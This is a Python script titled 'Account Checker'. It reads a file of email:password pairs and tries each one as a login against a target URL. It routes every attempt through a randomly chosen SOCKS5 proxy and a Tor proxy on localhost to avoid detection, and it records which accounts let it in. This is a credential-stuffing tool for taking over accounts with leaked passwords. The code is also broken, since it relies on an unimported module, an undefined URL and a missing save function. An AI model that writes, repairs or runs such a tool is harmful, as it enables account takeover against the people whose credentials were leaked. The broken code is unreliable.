import logging
import requests
import socks
import random

# Initialize logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Set up SOCKS proxy
socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
socket.socket = socks.socksocket

def use_proxy_with_auth(url, proxy_settings=None, auth=None, timeout=5):
    try:
        # Perform the request with SOCKS proxy
        response = requests.get(url, auth=auth, timeout=timeout, proxies=proxy_settings)
        response.raise_for_status()  # Raise an exception for HTTP errors
        return True
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed: {e}")
        return False
    except Exception as ex:
        logger.error(f"An unexpected error occurred: {ex}")
        return False


def load_credentials_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            credentials = [line.strip().split(':') for line in file.readlines()]
            return credentials
    except FileNotFoundError:
        logger.error("File not found.")
        raise

def main():
    logger.info("Welcome to Account Checker!")

    # Choose email:password file
    email_password_file = input("Enter the path to the email:password file: ")
    accounts = load_credentials_from_file(email_password_file)

    # Choose proxy file
    proxy_file = input("Enter the path to the proxy file: ")
    proxies = load_credentials_from_file(proxy_file)

    if not accounts:
        logger.error("No accounts found.")
        return

    if not proxies:
        logger.error("No proxies found.")
        return

    total_accounts = len(accounts)
    total_proxies = len(proxies)
    successful_logins = 0
    successful_accounts = []

    logger.info(f"Total accounts: {total_accounts}")
    logger.info(f"Total proxies: {total_proxies}")

    # Iterate through accounts and proxies
    for account_index, account in enumerate(accounts, start=1):
        email, password = account
        # Use a different proxy for each account
        proxy_host, proxy_port = random.choice(proxies)
        proxy_settings = {'http': f"socks5://{proxy_host}:{proxy_port}", 'https': f"socks5://{proxy_host}:{proxy_port}"}
        logger.info(f"Using proxy: {proxy_host}:{proxy_port}")
        if use_proxy_with_auth(url, proxy_settings, (email, password)):
            logger.info("Login successful")
            successful_logins += 1
            successful_accounts.append(account)
        else:
            logger.info("Login failed")

    logger.info(f"Total successful logins: {successful_logins}/{total_accounts}")

    # Save successful accounts to a file
    if successful_accounts:
        save_accounts_to_file(successful_accounts)

if __name__ == "__main__":
    main()
